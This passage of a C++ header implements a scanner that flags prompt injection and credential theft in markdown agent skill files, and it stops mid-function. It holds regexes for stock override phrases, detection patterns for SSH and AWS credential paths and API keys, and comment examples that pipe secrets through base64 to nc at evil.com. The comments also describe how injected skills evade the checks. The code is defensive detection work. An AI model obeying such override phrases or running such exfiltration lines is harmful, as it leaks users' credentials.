#pragma once
#include "infra/emit.h" // rw::emitTo / emitRaw / formatTo — THE emitter and its siblings
#include <string_view>       // %.*s (precision, pointer) collapses to one view


// skillscan.h — P1-C automatic skill security scanning.
// Scans markdown skill files LINE BY LINE for four vulnerability categories:
//
//   INJECTION   — case-insensitive, word-boundary-anchored prompt-injection phrases (CRITICAL;
//                 single generic words downgrade to WARN)
//   EXFILTRATE  — shell snippets that exfiltrate env vars or credentials (CRITICAL)
//   SCOPE-CREEP — body requests tools absent from the allowed-tools: frontmatter (WARN)
//   FRONTMATTER — YAML keys attempting to set model/system/temperature (WARN)
//
// No tree-sitter — ripwire has no markdown grammar. Pure line-iteration, PLUS a second pass inside
// `scanSkillText` over a whitespace-normalized join of the body (INJECTION only) to catch a phrase
// split across a newline.
// Pattern matching: guarded regexes (src/regexguard.h — ECMAScript, icase where relevant); INJECTION patterns
// are word-boundary-anchored phrases, not bare substrings (a bare substring like "disregard"
// false-positives on "disregarding", and "new persona" on "new personal"). A skill file is UNTRUSTED input, so a
// match the engine abandons can neither terminate the process (wrap.h's scan is noexcept) nor pass as "no match":
// the line gets a CRITICAL SCAN-INCOMPLETE:regex-abandoned finding, failing closed. EXFILTRATE:net-exfil is decided
// by hasNetExfilShape, a linear scan, because its regex was quadratic in the line (see there).
// Findings sorted by (line, rule) for determinism, then deduped on (line, rule) — the per-line and
// joined-body passes can both find the same phrase (byte-identical output across runs).
//
// Style: Allman braces; spaces inside parens; ASSUME/DISCLOSE; ~160–200 col wrap.

#include <algorithm>
#include <cctype>
#include <cstdio>
#include <cstdint>
#include <filesystem>
#include <fstream>
#include <iterator>
#include <sstream>
#include <string>
#include <string_view>
#include <utility>
#include <vector>

#include "infra/Diagnostics.h"
#include "regexguard.h"        // every pattern here is compiled and matched through the one regex boundary
#include "infra/namesplit.h"   // isIdentChar / isIdentStart — the ONE ASCII identifier byte class, which is \b's word class here
#include "infra/stackthreads.h"   // rw::runOnStackThreads — the scan runs on a thread whose stack its subject bound is computed for

namespace rw
{

// ── severity + finding ────────────────────────────────────────────────────────────────────────────

enum class SkillSeverity : std::uint8_t { Info = 0, Warn = 1, Critical = 2 };

struct SkillFinding
{
    SkillSeverity sev;
    int           line;       // 1-based line number in the scanned file
    const char*   rule;       // stable rule name — points into the static pattern table
    std::string   excerpt;    // the offending line, trimmed to ≤120 chars
};

inline const char* skillSeverityStr( SkillSeverity s ) noexcept
{
    switch( s )
    {
        case SkillSeverity::Critical: return "CRITICAL";
        case SkillSeverity::Warn:     return "WARN    ";
        case SkillSeverity::Info:     return "INFO    ";
    }
    return "INFO    ";
}

// ── declarative pattern table ─────────────────────────────────────────────────────────────────────

namespace detail
{

// Trim trailing whitespace (for excerpt display).
inline std::string_view trimRight( std::string_view s ) noexcept
{
    while( !s.empty() && std::isspace( static_cast<unsigned char>( s.back() ) ) )
    {
        s.remove_suffix( 1 );
    }
    return s;
}

// ── INJECTION phrase table (CRITICAL, with a generic-word WARN fallback) ────────────────────────
//
// A4-F12 fix: bare substrings ("disregard", "you are now", "new persona") false-positive on
// ordinary prose — "disregarding trailing whitespace", "Once you are now confident, run the
// tests", "the new personal access token" (⊃ "new persona" as a raw substring). Two changes:
//   1. Every phrase is word-boundary-anchored (\b...\b) so "disregard" no longer matches inside
//      "disregarding", and "new persona" no longer matches inside "new personal".
//   2. The genuinely ambiguous multi-word phrases are additionally ANCHORED to a continuation
//      that only shows up in a real imperative ("you are now A/AN/THE ...", "disregard
//      (all/the) previous/above ..."); a lone "disregard" that doesn't fit that shape downgrades
//      to WARN instead of CRITICAL (still worth a human glance, not a `wrap` blocker).
// Compiled once per `scanSkillText` call via `buildInjectionPatterns()` — std::regex is not
// trivially copyable so these can't be a `constexpr` array like the old literal table.
struct InjectionPattern
{
    const char*   regexSrc;   // ECMAScript regex source (compiled case-insensitive)
    const char*   rule;       // stable rule name emitted in findings
    SkillSeverity sev;        // CRITICAL for an anchored imperative, WARN for a bare generic word
    RegexCompile  re;         // a refusal (never expected for a constant) reads as undecided on every line: loud, fail-closed
};

// Keep entries in stable order (deterministic table iteration → deterministic findings order
// when a line matches multiple patterns — we break after the first match per line). Anchored
// (CRITICAL) forms are listed before their generic (WARN) fallback so the anchored form wins
// when both would match.
inline std::vector<InjectionPattern> buildInjectionPatterns()
{
    std::vector<InjectionPattern> v;
    const auto add = [ & ]( const char* src, const char* rule, SkillSeverity sev )
    {
        v.push_back( { src, rule, sev, compileGuardedRegex( src, kRegexEcmaScript | kRegexIcase ) } );
    };

    add( R"(\bignore\s+(all\s+|the\s+)?previous\s+instructions\b)", "INJECTION:ignore-prev",     SkillSeverity::Critical );
    add( R"(\bdisregard\s+(all\s+|the\s+)?(previous|above)\b)",     "INJECTION:disregard",       SkillSeverity::Critical );
    add( R"(\byou\s+are\s+now\s+(a|an|the)\b)",                     "INJECTION:you-are-now",     SkillSeverity::Critical );
    add( R"(\boverride\s+system\b)",                                "INJECTION:override-system", SkillSeverity::Critical );
    add( R"(\bnew\s+persona\b)",                                    "INJECTION:new-persona",     SkillSeverity::Critical );
    add( R"(\bforget\s+everything\s+above\b)",                      "INJECTION:forget-above",    SkillSeverity::Critical );
    add( R"(\bdisregard\b)",                                        "INJECTION:disregard-generic", SkillSeverity::Warn );

    return v;
}

// ── EXFILTRATE shell-snippet patterns (CRITICAL) ──────────────────────────────────────────────────
//
// We use std::regex (ECMAScript) for these — they involve combinations of tokens across a
// single line that are more naturally expressed as a regex. The regex is compiled once per
// call to `scanSkillText`; the construction is in `buildExfilPatterns()`.
//
// Rules:
//   EXFIL-APIKEY : line contains $ANTHROPIC_API_KEY
//   EXFIL-SSH    : line contains $HOME/.ssh or ~/.ssh or ~/.aws
//   EXFIL-NETEXFIL : line contains (curl|wget|nc) AND ($env-var OR base64), in EITHER order,
//                    fenced-code lines only (prose mentions are not flagged)
//
// "base64 + send" pattern — a line that contains base64 AND (curl|wget|nc), in either order
// (`… | base64 | nc host port` included) — is covered by EXFIL-NETEXFIL.
struct ExfilPattern
{
    const char*  rule;
    RegexCompile re;                    // empty (and unused) when isNetExfilShape decides the rule instead
    bool         isNetExfilShape;       // true ⇒ hasNetExfilShape's linear decision replaces the regex
    bool         requiresCmdContext;  // true ⇒ fires only in a fence OR alongside a transmit verb elsewhere on
                                      // the line (see hasTransmitVerb) — a bare prose mention is documentation.
    bool         fenceOnly;           // true ⇒ fires only inside a fenced code block (see net-exfil below).
    // a compiled regex is NOT trivially copyable → we build these at runtime once.
};

// EXFILTRATE:net-exfil in ONE pass over the line, replacing the regex
//
//     (\b(curl|wget|nc)\b.*(\$[A-Za-z_][A-Za-z0-9_]*|base64))|((\$[A-Za-z_][A-Za-z0-9_]*|base64).*\b(curl|wget|nc)\b)
//
// WHY. The `.*` between two alternations made that regex QUADRATIC in the line on both standard libraries: a fenced
// line of "curl curl curl …" with no variable after it backtracks the whole remainder from every "curl". Measured on
// the release binary: 20,000 bytes took 5.9 s and 200,000 bytes was still running at 60 s — a skill file is exactly
// the untrusted input a scanner must not hang on. (On libstdc++ a long enough `.*` also overflows the stack.)
//
// EQUIVALENCE, derived from the regex rather than approximated, and gated differentially against it
// (test/regexguardcheck.sh arm (f)): `.` matches any byte but '\n' and '\r' (the terminators both engines exclude
// for char), so both tokens must sit in one '\r'-free segment. A TOOL is a maximal word run ([A-Za-z0-9_]+, the
// \b rule in the "C" locale) equal to curl, wget or nc. A VAR is '$' followed by [A-Za-z_] — the regex's trailing
// [A-Za-z0-9_]* can always backtrack to empty, so that is its shortest form — or the substring "base64", which needs
// no boundary. The first alternative holds iff some tool ENDS at or before some var STARTS; the second iff some var's
// shortest END is at or before some tool STARTS. So one pass keeps four numbers per segment.
// What one '\r'-free segment holds, in the four positions the decision needs. A segment is bounded by '\r' or the line
// ends, both non-word, so a word run inside it is maximal in the line too and the \b rule can be read locally.
struct NetExfilPositions
{
    std::size_t earliestToolEnd = std::string_view::npos, latestToolStart = 0;
    std::size_t earliestVarEnd  = std::string_view::npos, latestVarStart  = 0;
    bool        hasTool = false, hasVar = false;

    void noteTool( std::size_t start, std::size_t end ) noexcept
    {
        hasTool         = true;
        earliestToolEnd = std::min( earliestToolEnd, end );
        latestToolStart = std::max( latestToolStart, start );
    }
    void noteVar( std::size_t start, std::size_t shortestEnd ) noexcept
    {
        hasVar         = true;
        latestVarStart = std::max( latestVarStart, start );
        earliestVarEnd = std::min( earliestVarEnd, shortestEnd );
    }
    bool isExfil() const noexcept
    {
        return hasTool && hasVar && ( earliestToolEnd <= latestVarStart || earliestVarEnd <= latestToolStart );
    }
};

inline NetExfilPositions netExfilPositions( std::string_view segment ) noexcept
{
    NetExfilPositions positions;
    for( std::size_t i = 0; i < segment.size(); )
    {
        if( !namesplit::isIdentChar( segment[i] ) )
        {
            if( segment[i] == '$' && i + 1 < segment.size() && namesplit::isIdentStart( segment[ i + 1 ] ) )
            {
                positions.noteVar( i, i + 2 );
            }
            ++i;
            continue;
        }
        std::size_t runEnd = i;
        while( runEnd < segment.size() && namesplit::isIdentChar( segment[runEnd] ) )
        {
            ++runEnd;
        }
        const std::string_view word = segment.substr( i, runEnd - i );
        if( word == "curl" || word == "wget" || word == "nc" )
        {
            positions.noteTool( i, runEnd );
        }
        for( std::size_t at = word.find( "base64" ); at != std::string_view::npos; at = word.find( "base64", at + 1 ) )
        {
            positions.noteVar( i + at, i + at + 6 );
        }
        i = runEnd;
    }
    return positions;
}

inline bool hasNetExfilShape( std::string_view line ) noexcept
{
    for( std::size_t segBegin = 0;; )
    {
        // `.` excludes both terminators, so a segment ends at either. scanSkillText hands over one line with no '\n',
        // but splitting on it too keeps this function equal to the regex on ANY input, not only on the one caller's.
        const std::size_t cr     = line.find_first_of( "\r\n", segBegin );
        const std::size_t segEnd = ( cr == std::string_view::npos ) ? line.size() : cr;
        if( netExfilPositions( line.substr( segBegin, segEnd - segBegin ) ).isExfil() )
        {
            return true;
        }
        if( segEnd == line.size() )
        {
            return false;
        }
        segBegin = segEnd + 1;
    }
}

inline std::vector<ExfilPattern> buildExfilPatterns()
{
    std::vector<ExfilPattern> v;

    // Any reference to the API key environment variable. A bare prose mention (a skill that DOCUMENTS the
    // pattern, e.g. ripwire's own audit skills) is not exfiltration — require command context (a fenced
    // run-block or a co-occurring transmit verb on the line). See scanSkillText's cmdContext gate.
    v.push_back( {
        "EXFILTRATE:api-key",
        compileGuardedRegex( R"(\$ANTHROPIC_API_KEY)", kRegexEcmaScript | kRegexIcase ), /*isNetExfilShape=*/false,
        /*requiresCmdContext=*/true, /*fenceOnly=*/false
    } );

    // SSH private key or AWS credentials directories. Same as above: "reads from `~/.ssh`" in a prose list is
    // documentation; `cat ~/.ssh/id_rsa | base64 | nc …` in a fenced block is the real thing.
    v.push_back( {
        "EXFILTRATE:ssh-aws-creds",
        compileGuardedRegex( R"((\$HOME/\.ssh|~/\.ssh|~/\.aws))", kRegexEcmaScript ), /*isNetExfilShape=*/false,
        /*requiresCmdContext=*/true, /*fenceOnly=*/false
    } );

    // Network exfiltration: (curl|wget|nc) combined with an env-var read or base64 on ONE line, in EITHER
    // order. A4-F12: the previous pattern assumed the network tool comes first, but real exfil pipelines put
    // it LAST — `cat secret | base64 | nc evil.com 1234` — which the tool-first-only regex never matched
    // despite this docstring claiming it did. The two alternatives below cover both orders.
    //
    // Context gate: `fenceOnly`, not `requiresCmdContext`. The generic requiresCmdContext gate
    // (lineInFence || hasTransmitVerb) is a no-op for this rule — hasTransmitVerb's verb list is a superset
    // of {curl, wget, nc}, so it is already true whenever this regex matches at all. Without a real gate,
    // prose like "use curl to fetch $VARIABLE from the API" (no fence, no pipe, just an explanatory
    // sentence) matches the pattern and would fire CRITICAL. Requiring the line to be inside a fenced code
    // block is what actually distinguishes a documented/live command from a prose mention.
    //
    // Decided by hasNetExfilShape (below), not by its regex — see there for why and for the exact equivalence.
    v.push_back( {
        "EXFILTRATE:net-exfil",
        RegexCompile{}, /*isNetExfilShape=*/true,
        /*requiresCmdContext=*/false, /*fenceOnly=*/true
    } );

    return v;
}

// A "command context" for an exfil pattern: the line is inside a fenced code block (where run-commands
// live) OR it carries a transmit/encode verb (the credential is actually being read + shipped, not merely
// named in prose). This is what separates a malicious skill from one that documents the attack.
inline RegexVerdict hasTransmitVerb( std::string_view line, std::size_t stackBytes ) noexcept
{
    static const RegexCompile kVerb = compileGuardedRegex( R"(\b(base64|curl|wget|nc|scp|cat|openssl)\b)", kRegexEcmaScript );
    return kVerb.refusal ? RegexVerdict::Exhausted : kVerb.regex.search( line, stackBytes );
}

// A skill pattern matched through the one regex boundary. Undecided — the engine abandoned the match, the constant
// was refused (which no test tree has ever seen), or the line was too long to hand the engine on this thread — reads
// Exhausted or Skipped, and the caller records a fail-closed finding either way. `stackBytes` is the stack the scan
// thread was SETTLED at (scanSkillText, runOnStackThreads), never SIZE_MAX: a skill file is UNTRUSTED input, and a
// subject longer than that stack's measured-safe bound must be skipped and disclosed, not handed to the engine.
inline RegexVerdict skillSearch( const RegexCompile& pattern, std::string_view line, std::size_t stackBytes, RegexCaptures* captures = nullptr ) noexcept
{
    if( pattern.refusal )
    {
        return RegexVerdict::Exhausted;
    }
    return captures != nullptr ? pattern.regex.search( line, *captures, stackBytes ) : pattern.regex.search( line, stackBytes );
}

static constexpr const char* kScanIncompleteRule         = "SCAN-INCOMPLETE:regex-abandoned";
static constexpr const char* kScanIncompleteRuleOversize = "SCAN-INCOMPLETE:line-oversize";
static constexpr const char* kScanIncompleteRuleAborted  = "SCAN-INCOMPLETE:scan-aborted";

// True if the byte at [pos] on `line` falls inside a BALANCED inline-code span (`…`) or a balanced
// double-quoted ("…") span — i.e. the matched text is being SHOWN AS DATA / an example, not stated as an
// instruction to the agent.  A prompt injection only works as bare imperative prose; once fully enclosed
// in a balanced open/close pair it is inert (the agent reads it as a string).
//
// Previous implementation used an odd-count-of-backticks-before-pos heuristic, which is trivially evaded
// by inserting a single stray backtick or quote anywhere before the phrase (the leading ` does not need to
// close before the phrase — the odd-count fires regardless).  This version requires the phrase to actually
// sit between a matched open-tick and a close-tick (or open-quote and close-quote) that BOTH appear on the
// same line.
//
// Algorithm: scan the line and track open spans.  A backtick at position i either OPENS a new span (if we
// are not already inside one) or CLOSES the current open span.  After scanning, check whether [pos,
// pos+phraseLen) is entirely contained within any closed span.  Same for double-quotes.
//
// Residual evasion envelope: a deliberately multi-backtick construction like `` `phrase` `` (two ticks open,
// one close — parsed as an unclosed span by this scanner) is NOT treated as data, which is the safer
// failure mode.  The scanner is a best-effort heuristic linter, not a sandbox.
inline bool isShownAsData( std::string_view line, std::size_t pos, bool quotesCountAsData = true ) noexcept
{
    const std::size_t N = line.size();

    // ── check balanced backtick spans ─────────────────────────────────────────────────────────────
    {
        bool  inSpan  = false;
        std::size_t spanStart = 0;
        for( std::size_t i = 0; i < N; ++i )
        {
            if( line[i] != '`' )
            {
                continue;
            }
            if( !inSpan )
            {
                inSpan    = true;
                spanStart = i + 1;   // span content starts after the opening tick
            }
            else
            {
                // Closing tick at i: span covers [spanStart, i).
                // The phrase at [pos, …) is "inside" if pos >= spanStart AND pos < i.
                if( pos >= spanStart && pos < i )
                {
                    return true;
                }
                inSpan = false;
            }
        }
        // Unclosed span: do NOT treat as data — an unmatched opening tick is not a real inline-code span.
    }

    // ── check balanced double-quote spans (skipped in YAML frontmatter, where quotes are syntax) ──
    if( quotesCountAsData )
    {
        bool  inSpan  = false;
        std::size_t spanStart = 0;
        for( std::size_t i = 0; i < N; ++i )
        {
            if( line[i] != '"' )
            {
                continue;
            }
            if( !inSpan )
            {
                inSpan    = true;
                spanStart = i + 1;
            }
            else
            {
                if( pos >= spanStart && pos < i )
                {
                    return true;
                }
                inSpan = false;
            }
        }
        // Unclosed quote: do NOT treat as data.
    }

    return false;
}

// ── FRONTMATTER overreach: YAML keys attempting to set model/system/temperature (WARN) ──────────
//
// We are inside the YAML frontmatter block (between the two `---` delimiters) when these match.
// The scanner tracks frontmatter state.
struct FrontmatterPattern
{
    const char*  rule;
    RegexCompile re;
};

inline std::vector<FrontmatterPattern> buildFrontmatterPatterns()
{
    struct Row { const char* rule; const char* regexSrc; };
    static constexpr Row kRows[] = {
        { "FRONTMATTER:model-override",       R"(^\s*model\s*:)" },         // override the model at the harness level
        { "FRONTMATTER:system-override",      R"(^\s*system\s*:)" },        // inject a system prompt above the harness
        { "FRONTMATTER:temperature-override", R"(^\s*temperature\s*:)" },   // override inference parameters
    };
    std::vector<FrontmatterPattern> v;
    v.reserve( std::size( kRows ) );
    for( const Row& row : kRows )
    {
        v.push_back( { row.rule, compileGuardedRegex( row.regexSrc, kRegexEcmaScript ) } );
    }
    return v;
}

// ── SCOPE-CREEP: body references Bash/shell/network execution without it being allowed ──────────
//
// Strategy (conservative / precision-over-recall — false CRITICALs are worse than misses):
// 1. Parse `allowed-tools:` from frontmatter.
// 2. If Bash is NOT in allowed-tools AND the body contains shell execution indicators
//    (backtick-fenced or `$(...) ` or `curl/wget` outside a quoted example), flag WARN.
//
// We flag WARN (not CRITICAL) because scope-creep is a policy issue, not directly injective.
//
// Shell indicators in the body (outside frontmatter):
//   - Lines starting with ``` or ` that contain shell commands
//   - curl / wget appearing in what looks like an instruction (not in a ---fenced block)

static constexpr const char* kScopeCreepRule = "SCOPE-CREEP:bash-not-allowed";

// Parse the `allowed-tools:` line from the frontmatter portion (raw text, all lines).
// Returns the set of tool names mentioned (trimmed, no quotes).
inline std::vector<std::string> parseAllowedTools( const std::vector<std::string>& lines, int frontmatterEnd )
{
    std::vector<std::string> tools;
    for( int i = 0; i < frontmatterEnd && i < int( lines.size() ); ++i )
    {
        const std::string& ln = lines[i];
        // Match "allowed-tools: Bash, Read, ..." (or "allowed-tools: [Bash, Read]")
        const std::size_t pos = ln.find( "allowed-tools:" );
        if( pos == std::string::npos )
        {
            continue;
        }

        std::string rest = ln.substr( pos + 14 );   // after "allowed-tools:"
        // strip leading whitespace and optional [ ]
        std::size_t s = 0;
        while( s < rest.size() && ( rest[s] == ' ' || rest[s] == '\t' || rest[s] == '[' ) )
        {
            ++s;
        }
        std::size_t e = rest.size();
        while( e > s && ( rest[e - 1] == ' ' || rest[e - 1] == '\t' || rest[e - 1] == ']' || rest[e - 1] == '\r' || rest[e - 1] == '\n' ) )
        {
            --e;
        }
        rest = rest.substr( s, e - s );

        // comma-split
        std::istringstream ss( rest );
        std::string tok;
        while( std::getline( ss, tok, ',' ) )
        {
            std::size_t ts = 0, te = tok.size();
            while( ts < te && std::isspace( static_cast<unsigned char>( tok[ts] ) ) )
            {
                ++ts;
            }
            while( te > ts && std::isspace( static_cast<unsigned char>( tok[te - 1] ) ) )
            {
                --te;
            }
            if( ts < te )
            {
                tools.push_back( tok.substr( ts, te - ts ) );
            }
        }
        break;   // only the first allowed-tools: line matters
    }
    return tools;
}

inline bool toolAllowed( const std::vector<std::string>& tools, std::string_view name ) noexcept
{
    for( const std::string& t : tools )
    {
        if( std::string_view( t ) == name )
        {
            return true;
        }
    }
    return false;
}

}   // namespace detail

// F-B3 (owner ruling 3): a directory walk that gave up before every entry under it was visited, over content
// that WOULD BE INSTALLED — the caller (main.cpp's --scan-skills, wrap.h's wrapScanSkillDir) names this rule
// on a synthetic finding rather than reading a stopped walk as an honest "clean". Public (not detail::) because
// both those walks live outside this file.
static constexpr const char* kScanIncompleteRuleWalk = "SCAN-INCOMPLETE:walk-stopped-early";
// The same ruling for one FILE the walk found and scanSkillFileChecked could not read (mode 000 in an open folder,
// an I/O error, a descriptor limit): the file is still there to be copied, so the verdict is CRITICAL with this rule
// on a row naming it, never a skip that leaves the verdict "clean". A folder the walk cannot ENTER is different —
// its contents cannot be copied either — and stays WARN in wrap.h.
static constexpr const char* kScanIncompleteRuleUnreadable = "SCAN-INCOMPLETE:file-unreadable";

// ── core scanner ─────────────────────────────────────────────────────────────────────────────────

// The joined-body injection pass (below) searches windows of the joined body, never the whole of it: one skill's body
// is routinely tens of KB, past the engine's measured-safe subject on any stack (41,858 B for INJECTION:ignore-prev at
// 256 MiB under libstdc++, 1,225 B at 8 MiB), and a skipped body fails the whole skill CLOSED. Every INJECTION match is
// short once whitespace runs are collapsed to one space: kSkillInjectionSpanBytes, the longest being "ignore the
// previous instructions" (skillscanreadcheck.sh derives the span from buildInjectionPatterns' sources and fails when a
// pattern outgrows this constant). Windows overlap by more than that, so each match lies whole in one window. Windows
// start after, and end at, a space, so a cut never makes a \b where the text has none.
inline constexpr std::size_t kSkillJoinedWindowBytes  = 1024;
inline constexpr std::size_t kSkillJoinedOverlapBytes = 128;
inline constexpr std::size_t kSkillInjectionSpanBytes = 32;
static_assert( kSkillInjectionSpanBytes < kSkillJoinedOverlapBytes && kSkillJoinedOverlapBytes < kSkillJoinedWindowBytes,
               "a joined-body window overlap must exceed the longest INJECTION match, or a match across a window edge is lost" );
inline constexpr std::size_t kSkillScanStackBytes     = 256 * 1024 * 1024;   // the grep scan threads' size (search.h kGrepScanStackBytes)

// Scan the raw text of a skill markdown file line by line, on a thread settled at `stackBytes`. Findings are sorted
// (line, rule).
inline std::vector<SkillFinding> scanSkillTextOn( std::string_view text, std::size_t stackBytes )
{
    using namespace detail;

    // Build regex patterns once per call (cheap for the sizes involved).
    const std::vector<ExfilPattern>       exfilPats  = buildExfilPatterns();
    const std::vector<FrontmatterPattern> frontPats  = buildFrontmatterPatterns();
    const std::vector<InjectionPattern>   injPats    = buildInjectionPatterns();

    std::vector<SkillFinding> findings;

    // Split into lines (retain line content for matching and excerpt extraction).
    std::vector<std::string> lines;
    {
        std::size_t start = 0;
        while( start <= text.size() )
        {
            const std::size_t nl = text.find( '\n', start );
            const std::size_t end = ( nl == std::string_view::npos ) ? text.size() : nl;
            lines.emplace_back( text.substr( start, end - start ) );
            start = end + 1;
        }
        // If the last character was '\n', we get an empty trailing entry — trim it.
        if( !lines.empty() && lines.back().empty() )
        {
            lines.pop_back();
        }
    }

    // ── frontmatter state: find the YAML block (first `---` to second `---`) ────────────────────
    int frontmatterEnd = 0;   // index of the line AFTER the closing `---` (or 0 if none)
    {
        bool inFront = false;
        for( int i = 0; i < int( lines.size() ); ++i )
        {
            const std::string_view ln = trimRight( lines[i] );
            if( i == 0 && ln == "---" ) { inFront = true; continue; }
            if( inFront && ln == "---" ) { frontmatterEnd = i + 1; break; }
        }
    }

    // Parse allowed-tools from frontmatter for scope-creep check.
    const std::vector<std::string> allowedTools = parseAllowedTools( lines, frontmatterEnd );
    const bool                      bashAllowed  = toolAllowed( allowedTools, "Bash" );

    // helper: add a finding with a clipped excerpt
    const auto addFinding = [ & ]( SkillSeverity sev, int lineNum, const char* rule, std::string_view lineText )
    {
        std::string excerpt( trimRight( lineText ) );
        if( excerpt.size() > 120 ) { excerpt.resize( 117 ); excerpt += "..."; }
        findings.push_back( { sev, lineNum, rule, std::move( excerpt ) } );
    };
    // helper: the regex boundary's answer as a plain hit, failing CLOSED on an undecided match — the line gets a
    // CRITICAL scan-incomplete finding (deduped per line below), so an unscannable skill can never read "clean".
    // Exhausted (the engine gave up mid-match) and Skipped (the line was too long to hand the engine at all,
    // F-B3 / owner ruling 3) are both undecided and both fail closed — every line in a skill file IS installable
    // content, so there is no WARN tier here, only CRITICAL or a real answer.
    const auto isHit = [ & ]( RegexVerdict verdict, int lineNum, std::string_view lineText )
    {
        if( verdict == RegexVerdict::Exhausted )
        {
            addFinding( SkillSeverity::Critical, lineNum, kScanIncompleteRule, lineText );
        }
        else if( verdict == RegexVerdict::Skipped )
        {
            addFinding( SkillSeverity::Critical, lineNum, kScanIncompleteRuleOversize, lineText );
        }
        return verdict == RegexVerdict::Hit;
    };

    // ── fenced-block injection suppression policy ─────────────────────────────────────────────────
    //
    // A fenced code block with a recognised EXAMPLE language tag (text, example, output, none, plain, raw)
    // is treated as documentation data — injection phrases inside are suppressed (the author is SHOWING the
    // pattern, not issuing it).  Example: ```text\nIgnore previous instructions\n``` in docs.md.
    //
    // A BARE fence (no language tag, just ```) or an executable-language fence (bash, sh, python, …) is
    // treated as prose the agent will act on — injection phrases inside ARE flagged CRITICAL.  Rationale:
    // an attacker wrapping a bare ``\nIgnore…\n``` is still issuing an imperative; a bare fence does not
    // make the content inert.  A few false positives on contrived docs are acceptable; a missed real
    // injection is not.
    //
    // Residual evasion envelope: a fence tagged ```example or ```text that genuinely contains an injection
    // directive will be suppressed — an attacker who knows this can evade.  Tag-based suppression is still
    // better than the prior unconditional suppression of ALL fences.
    //
    // The `requiresCmdContext` EXFIL patterns already need the line to be in a fence (command context) to
    // fire — so EXFIL detection keeps its original lineInFence gate (commands in fences are real).
    // INJECTION detection uses `lineInExampleFence` for its suppression (not lineInFence).

    // Returns true if the given fence-opening language tag is a purely-example/data marker (not executable).
    const auto isExampleFenceLang = []( std::string_view tag ) noexcept -> bool
    {
        // Normalise: strip leading/trailing whitespace.
        while( !tag.empty() && std::isspace( static_cast<unsigned char>( tag.front() ) ) )
        {
            tag.remove_prefix( 1 );
        }
        while( !tag.empty() && std::isspace( static_cast<unsigned char>( tag.back() ) ) )
        {
            tag.remove_suffix( 1 );
        }
        // Empty tag → bare fence → NOT an example fence (treat as live prose → injection may fire).
        if( tag.empty() )
        {
            return false;
        }
        // Recognised data/example markers.
        return tag == "text"    || tag == "example"  || tag == "output"
            || tag == "none"    || tag == "plain"    || tag == "raw"
            || tag == "markup"  || tag == "template";
    };

    // Accumulator for the whitespace-normalized joined-body INJECTION pass (A4-F12 §3): the body's
    // non-example-fence lines, whitespace-collapsed and space-joined, plus each line's start offset in the
    // joined buffer so a cross-line match can be attributed back to a real line number.
    std::string                              joinedBody;
    std::vector<std::pair<std::size_t,int>>  joinedLineOffsets;

    // ── scan each line ────────────────────────────────────────────────────────────────────────────
    bool inFence        = false;   // inside a ``` / ~~~ fenced code block
    bool inExampleFence = false;   // inside a fence whose lang tag marks it as an EXAMPLE (data, not live)
    for( int i = 0; i < int( lines.size() ); ++i )
    {
        const int          lineNum = i + 1;        // 1-based
        const std::string& ln      = lines[i];
        const bool         inFront = ( frontmatterEnd > 0 && i > 0 && i < frontmatterEnd );
        const bool         inBody  = !inFront && ( frontmatterEnd == 0 || i >= frontmatterEnd );

        // fenced-code membership of THIS line is the state BEFORE a marker toggles it, so command lines
        // BETWEEN the ``` markers read lineInFence==true while the markers themselves read false.
        bool lineInFence        = false;
        bool lineInExampleFence = false;
        if( inBody )
        {
            lineInFence        = inFence;
            lineInExampleFence = inExampleFence;
            std::string_view lv = ln;
            while( !lv.empty() && ( lv.front() == ' ' || lv.front() == '\t' ) )
            {
                lv.remove_prefix( 1 );
            }
            if( lv.size() >= 3 && ( lv.compare( 0, 3, "```" ) == 0 || lv.compare( 0, 3, "~~~" ) == 0 ) )
            {
                if( !inFence )
                {
                    // Opening a new fence: extract the language tag (text after the marker).
                    std::string_view marker = lv.compare( 0, 3, "```" ) == 0 ? "```" : "~~~";
                    std::string_view langTag = lv.substr( marker.size() );
                    inExampleFence = isExampleFenceLang( langTag );
                    inFence = true;
                }
                else
                {
                    // Closing the current fence.
                    inFence        = false;
                    inExampleFence = false;
                }
            }
        }

        if( inFront )
        {
            // ── FRONTMATTER checks ────────────────────────────────────────────────────────────────
            for( const FrontmatterPattern& p : frontPats )
            {
                if( isHit( skillSearch( p.re, ln, stackBytes ), lineNum, ln ) )
                {
                    addFinding( SkillSeverity::Warn, lineNum, p.rule, ln );
                    break;   // one finding per line per category
                }
            }

            // ── INJECTION in frontmatter ──────────────────────────────────────────────────────────
            // The `description:` field is precisely the text harnesses inject into the agent's prompt —
            // an injection phrase there is MORE dangerous than one in the body, not exempt. YAML double
            // quotes are value syntax, not a shown-as-data marker, so only backtick spans suppress here.
            for( const InjectionPattern& p : injPats )
            {
                RegexCaptures m;
                if( isHit( skillSearch( p.re, ln, stackBytes, &m ), lineNum, ln ) && !isShownAsData( ln, std::size_t( m.position( 0 ) ), /*quotesCountAsData=*/false ) )
                {
                    addFinding( p.sev, lineNum, p.rule, ln );
                    break;   // one INJECTION finding per line
                }
            }
        }

        if( inBody )
        {
            // ── INJECTION (case-insensitive literal) ──────────────────────────────────────────────
            // Flag a bare-prose imperative: NOT inside an example-tagged fence (```text / ```example),
            // and NOT fully enclosed in a balanced inline-code or double-quote span.
            //
            // A BARE fence (no lang tag) or an executable-language fence does NOT suppress injection
            // detection — a phrase like "Ignore previous instructions" inside a bare ``` block is still
            // prose the agent reads and acts on.  Only ```text / ```example / similar data-marker fences
            // represent "shown as data".
            //
            // isShownAsData now requires a BALANCED enclosing span (open tick before pos + close tick
            // after pos on the same line), not merely an odd count of preceding ticks/quotes.
            if( !lineInExampleFence )
            {
                for( const InjectionPattern& p : injPats )
                {
                    RegexCaptures m;
                    if( isHit( skillSearch( p.re, ln, stackBytes, &m ), lineNum, ln ) && !isShownAsData( ln, std::size_t( m.position( 0 ) ) ) )
                    {
                        addFinding( p.sev, lineNum, p.rule, ln );
                        break;   // one INJECTION finding per line (highest-priority match)
                    }
                }

                // ── feed the whitespace-normalized joined-body pass (A4-F12 §3) ──────────────────────
                // A phrase split across a newline ("Ignore previous\ninstructions") matches nothing in the
                // per-line scan above. Collect this line's content (whitespace runs collapsed to one space)
                // into a single joined buffer scanned separately after this loop, recording where each
                // line's content starts in the buffer so a cross-line match can be attributed back to a
                // real line number. Lines inside an example fence are excluded here too — same policy as
                // the per-line scan just above.
                std::string normalized;
                normalized.reserve( ln.size() );
                bool prevWasSpace = false;
                for( char c : ln )
                {
                    if( std::isspace( static_cast<unsigned char>( c ) ) )
                    {
                        if( !prevWasSpace && !normalized.empty() )
                        {
                            normalized += ' ';
                        }
                        prevWasSpace = true;
                    }
                    else
                    {
                        normalized += c;
                        prevWasSpace = false;
                    }
